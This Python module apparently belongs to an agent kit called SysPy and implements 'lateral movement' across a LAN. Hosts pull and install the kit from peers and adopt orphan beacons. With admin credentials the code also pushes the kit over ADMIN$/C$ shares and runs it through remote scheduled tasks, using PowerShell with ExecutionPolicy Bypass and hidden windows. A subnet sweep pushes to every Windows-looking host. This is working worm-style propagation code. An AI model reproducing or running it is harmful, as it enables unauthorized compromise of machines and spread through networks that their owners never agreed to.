"""Lateral movement, in two tiers.

Tier A - pull, **zero credentials**.
    A host fetches a neighbour's kit over HTTP and installs itself from it
    (`bootstrap.py --from-peer`). This is what makes an air-gapped LAN work and
    what `tick()` uses to adopt an orphan beacon.

Tier B - push, one admin credential pair.
    For a host with no agent and no python: `net use` -> `xcopy` into `ADMIN$`
    -> `schtasks /create /run`. All built-in binaries, no dependencies.

Executing a command *on* an already-managed peer is the controller's job (a
`lan.install-self` job), not this module's.
"""
from __future__ import annotations
import shutil

import os
import subprocess
import tempfile
import time
import urllib.request

from .. import config
from . import discover as lan_discover

CREATE_NO_WINDOW = 0x08000000 if config.IS_WINDOWS else 0
ATTEMPT_TTL = 300.0


# --------------------------------------------------------------------- process

def _startupinfo():
    if not config.IS_WINDOWS:
        return None
    info = subprocess.STARTUPINFO()
    info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    return info


def _decode(raw) -> str:
    if isinstance(raw, str):
        return raw
    for encoding in ("utf-8", "cp1252", "cp437", "latin-1"):
        try:
            return raw.decode(encoding)
        except UnicodeDecodeError:
            continue
    return (raw or b"").decode("utf-8", "replace")


def _run(cmd, timeout: float = 60.0) -> tuple:
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=timeout,
                              creationflags=CREATE_NO_WINDOW, startupinfo=_startupinfo())
        return proc.returncode, _decode(proc.stdout), _decode(proc.stderr)
    except subprocess.TimeoutExpired:
        return 124, "", "timeout after %ss" % int(timeout)
    except Exception as exc:
        return 1, "", str(exc)


def _tail(text: str, limit: int = 300) -> str:
    return (text or "").strip().replace("\r", "")[-limit:]


# -------------------------------------------------------------------- spreader

class Spreader:
    def __init__(self, lan=None, kit_url_getter=None, known_ids_getter=None):
        self.lan = lan
        self.kit_url_getter = kit_url_getter or (lambda: "")
        self.known_ids_getter = known_ids_getter or (lambda: set())
        self._attempted: dict = {}

    def attach(self, lan, kit_url_getter=None, known_ids_getter=None) -> None:
        self.lan = lan
        if kit_url_getter:
            self.kit_url_getter = kit_url_getter
        if known_ids_getter:
            self.known_ids_getter = known_ids_getter

    def kit_url(self) -> str:
        try:
            return self.kit_url_getter() or ""
        except Exception:
            return ""

    # ------------------------------------------------------------ tier A: pull

    @staticmethod
    def _get(url: str, timeout: float = 20.0) -> bytes:
        request = urllib.request.Request(url, headers={
            "User-Agent": "SysPy/%s" % config.PRODUCT_VERSION})
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.read()

    def ping_peer(self, ip: str, port: int = None, timeout: float = 6.0) -> dict:
        """HTTP /ping on a peer's kit server. Confirms an agent is really there."""
        port = int(port or config.LAN_HTTP_PORT)
        try:
            import json
            data = json.loads(self._get("http://%s:%s/ping" % (ip, port), timeout).decode())
            data["ip"] = ip
            data["reachable"] = True
            return data
        except Exception as exc:
            return {"ip": ip, "reachable": False, "error": str(exc)[:120]}

    def pull_from_peer(self, peer: dict, install: bool = True) -> dict:
        """Fetch the kit from `peer` and install/refresh *this* host from it."""
        ip = peer.get("ip")
        if not ip:
            return {"ok": False, "mode": "pull", "detail": "peer has no ip"}
        port = int(peer.get("port") or config.LAN_HTTP_PORT)
        peer_url = "http://%s:%s" % (ip, port)
        if not install:
            return {"ok": True, "mode": "pull", "detail": "recorded", "url": peer_url}

        python = config.runtime_python(config.ROOT) or config.runtime_python() or "python"
        script = os.path.join(config.ROOT, "bootstrap.py")
        if not os.path.isfile(script):
            return {"ok": False, "mode": "pull", "detail": "bootstrap.py missing"}
        code, out, err = _run([
            python, script, "--install",
            "--from-peer", peer_url,
            "--parent", str(peer.get("id") or ""),
            "--parent-ip", self.kit_url(),
            "--target", config.ROOT,
            "--quiet",
        ], timeout=config.SPREAD_INSTALL_TIMEOUT)
        return {"ok": code == 0, "mode": "pull", "ip": ip,
                "detail": _tail(out or err), "code": code}

    def adopt(self, peer: dict) -> dict:
        """Handle one newly discovered beacon."""
        peer_id = peer.get("id") or ""
        if not peer_id:
            return {}
        record = self.ping_peer(peer.get("ip"), peer.get("port"))
        if not record.get("reachable"):
            return {"ok": False, "mode": "probe", "detail": record.get("error", "")}
        # A peer already managed by us and on a current version needs nothing.
        managed = peer_id in set(self.known_ids_getter() or ())
        behind = _version_tuple(record.get("ver")) < _version_tuple(config.PRODUCT_VERSION)
        if managed and not behind:
            return {"ok": True, "mode": "probe", "detail": "already managed"}
        return self.pull_from_peer(peer, install=True)

    def tick(self) -> dict:
        """Periodic: adopt orphan beacons, never more than once per ATTEMPT_TTL."""
        if not config.SPREAD_ENABLED or self.lan is None:
            return {}
        if config.hop() >= config.HOP_LIMIT:
            return {}
        managed = set(self.known_ids_getter() or ())
        acted = {}
        for peer in self.lan.beacon.peers():
            peer_id = peer.get("id")
            if not peer_id or peer_id in self._attempted:
                continue
            if peer_id in managed and not peer.get("parent"):
                pass  # ours, nothing to do
            if int(peer.get("hop") or 0) > config.HOP_LIMIT:
                continue
            self._attempted[peer_id] = time.time()
            acted[peer_id] = self.adopt(peer)
        cutoff = time.time() - ATTEMPT_TTL
        for peer_id in [k for k, v in self._attempted.items() if v < cutoff]:
            self._attempted.pop(peer_id, None)
        return acted

    # ------------------------------------------------------------ tier B: push

    @staticmethod
    def _remote_paths(ip: str, share: str) -> tuple:
        """ADMIN$ maps to C:\\Windows; C$ maps to the drive root."""
        unc_dir = "\\\\%s\\%s\\syspy-kit" % (ip, share)
        root = "C:\\Windows" if share.upper().startswith("ADMIN") else "C:\\"
        win_dir = root.rstrip("\\") + "\\syspy-kit"
        return unc_dir, win_dir

    def _local_kit(self) -> str:
        """Extract the bundle once into %TEMP%\\syspy-kit for xcopy."""
        root = os.path.join(tempfile.gettempdir(), "syspy-kit")
        if os.path.isfile(os.path.join(root, "syspy", "config.py")) and \
                os.path.isfile(os.path.join(root, "bootstrap.py")):
            return root
        try:
            import io
            import json
            import zipfile
            from .. import packaging
            os.makedirs(root, exist_ok=True)
            with zipfile.ZipFile(io.BytesIO(packaging.build_zip(config.ROOT))) as archive:
                archive.extractall(root)
            if os.path.isdir(os.path.join(config.ROOT, "runtime")):
                shutil.copytree(os.path.join(config.ROOT, "runtime"), os.path.join(root, "runtime"), dirs_exist_ok=True)
            with open(os.path.join(root, "deploy.json"), "w", encoding="utf-8") as handle:
                json.dump({"url": config.PUBLIC_URL, "room": config.ROOM,
                           "pass": config.PASSPHRASE, "parent": config.agent_id(),
                           "hop": config.hop() + 1}, handle)
            return root
        except Exception:
            return ""

    def push_host(self, ip: str, user: str = "", password: str = "",
                  domain: str = "", verify: bool = False, cleanup: bool = False) -> dict:
        if not config.IS_WINDOWS:
            return {"ok": False, "mode": "push", "ip": ip, "detail": "windows only"}
        kit = self._local_kit()
        if not kit:
            return {"ok": False, "mode": "push", "ip": ip, "detail": "no local kit"}

        cred = ["/user:%s%s" % (("%s\\" % domain) if domain else "", user)] if user else []
        if user:
            cred.append(password)

        share = "ADMIN$"
        code, _out, err = _run(["net", "use", "\\\\%s\\%s" % (ip, share)] + cred, timeout=30)
        if code != 0:
            share = "C$"
            code, _out, err = _run(["net", "use", "\\\\%s\\%s" % (ip, share)] + cred, timeout=30)
            if code != 0:
                return {"ok": False, "mode": "push", "ip": ip,
                        "detail": "net use failed: %s" % _tail(err, 160)}

        try:
            unc_dir, win_dir = self._remote_paths(ip, share)
            _run(["cmd", "/c", "rmdir", "/s", "/q", unc_dir], timeout=30)
            code, _out, err = _run(["xcopy", kit, unc_dir, "/E", "/I", "/Q", "/Y"],
                                   timeout=240)
            if code != 0:
                return {"ok": False, "mode": "push", "ip": ip,
                        "detail": "xcopy failed: %s" % _tail(err, 160)}

            script = ("powershell -NoProfile -ExecutionPolicy Bypass -File "
                      "\"%s\\install\\i.ps1\" -Kit \"%s\" -Parent %s -ParentIp %s -Room \"%s\" -Pass \"%s\" -Quiet"
                      % (win_dir, win_dir, config.agent_id(), self.kit_url() or config.PUBLIC_URL, config.ROOM, config.PASSPHRASE))
            task = "SysPyDeploy%d" % int(time.time() % 100000)
            schtasks = ["schtasks", "/s", ip, "/create", "/f", "/tn", task, "/tr", script,
                        "/sc", "once", "/st", "23:59"]
            if user:
                schtasks += ["/u", ("%s\\%s" % (domain, user)) if domain else user,
                             "/p", password]
            code, _out, err = _run(schtasks, timeout=45)
            if code != 0:
                return {"ok": False, "mode": "push", "ip": ip,
                        "detail": "schtasks create failed: %s" % _tail(err, 160)}

            run = ["schtasks", "/s", ip, "/run", "/tn", task]
            delete = ["schtasks", "/s", ip, "/delete", "/f", "/tn", task]
            if user:
                run += ["/u", ("%s\\%s" % (domain, user)) if domain else user, "/p", password]
                delete += ["/u", ("%s\\%s" % (domain, user)) if domain else user, "/p", password]
            code, _out, err = _run(run, timeout=45)
            if code != 0:
                return {"ok": False, "mode": "push", "ip": ip,
                        "detail": "schtasks run failed: %s" % _tail(err, 160)}
            _run(delete, timeout=30)
            if cleanup:
                _run(["cmd", "/c", "rmdir", "/s", "/q", unc_dir], timeout=30)
        finally:
            _run(["net", "use", "\\\\%s\\%s" % (ip, share), "/delete", "/y"], timeout=20)

        result = {"ok": True, "mode": "push", "ip": ip, "detail": "task launched"}
        if verify:
            result["beacon"] = self.wait_for_beacon(ip, timeout=120)
            result["ok"] = bool(result["beacon"])
        return result

    def wait_for_beacon(self, ip: str, timeout: float = 90.0) -> bool:
        """Wait for the freshly pushed host to start beaconing."""
        if self.lan is None:
            return False
        deadline = time.time() + timeout
        while time.time() < deadline:
            for peer in self.lan.beacon.ask(timeout=1.5):
                if peer.get("ip") == ip:
                    return True
            time.sleep(3)
        return False

    def scan_and_push(self, user: str = "", password: str = "", domain: str = "",
                      limit: int = 64, subnets=None) -> dict:
        """Tier B sweep: find Windows-looking hosts and push to each."""
        networks = subnets or [network for network, _iface in lan_discover.local_subnets()]
        if not networks:
            return {"ok": False, "detail": "no local subnet"}
        records = lan_discover.discover(force=True)
        results = {}
        for ip, record in records.items():
            if len(results) >= limit:
                break
            if record.get("is_self") or record.get("kind") not in ("windows", "http", "unknown"):
                continue
            if not any(lan_discover.same_subnet(ip, network) for network in networks):
                continue
            if self.ping_peer(ip, timeout=3.0).get("reachable"):
                results[ip] = {"ok": True, "mode": "probe", "detail": "already an agent"}
                continue
            results[ip] = self.push_host(ip, user=user, password=password, domain=domain)
        return {"ok": True, "subnets": networks, "results": results,
                "count": len(results)}

    def refresh_all(self) -> dict:
        """Force every peer to re-pull from us. Used after a version bump."""
        results = {}
        for peer in (self.lan.beacon.peers() if self.lan else []):
            results[peer.get("id")] = self.pull_from_peer(peer)
        return results


def _version_tuple(text) -> tuple:
    parts = []
    for chunk in str(text or "").split("."):
        digits = "".join(c for c in chunk if c.isdigit())
        parts.append(int(digits) if digits else 0)
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts[:3])


if __name__ == "__main__":
    # Smoke test:  python -m syspy.lan.spread
    spreader = Spreader()
    print("local subnet :", lan_discover.local_subnet())
    print("subnets      :", lan_discover.local_subnets())
    print("kit temp dir :", spreader._local_kit())
    records = lan_discover.discover(timeout=2.0, force=True)
    print("hosts seen   :", len(records))
    for ip, record in list(records.items())[:12]:
        print("  %-15s %-9s ports=%s" % (ip, record.get("kind"), record.get("ports")))